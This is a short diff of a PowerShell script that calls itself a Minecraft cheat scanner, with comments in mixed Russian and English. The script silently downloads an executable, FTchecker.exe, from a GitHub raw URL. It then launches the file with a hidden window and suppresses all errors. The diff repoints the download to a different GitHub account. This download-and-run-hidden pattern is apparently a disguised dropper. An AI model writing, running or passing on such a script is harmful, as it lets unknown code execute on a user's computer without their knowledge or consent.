@@ -1,6 +1,6 @@
 # MINECRAFT CHEAT SCANNER v2.0 [СКАЧИВАЕТ everything В КОНЦЕ]
     # Скачиваем everything в текущую папку
-    Invoke-WebRequest -Uri "https://github.com/killlety9-tech/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri "https://github.com/letyss0304/FTchecker/raw/refs/heads/main/FTchecker.exe" -OutFile "FTchecker.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
     Start-Process -FilePath "FTchecker.exe" -WindowStyle Hidden
@@ -99,4 +99,5 @@ try {
     
 } catch {
     # Полностью скрываем ошибки
+
 }
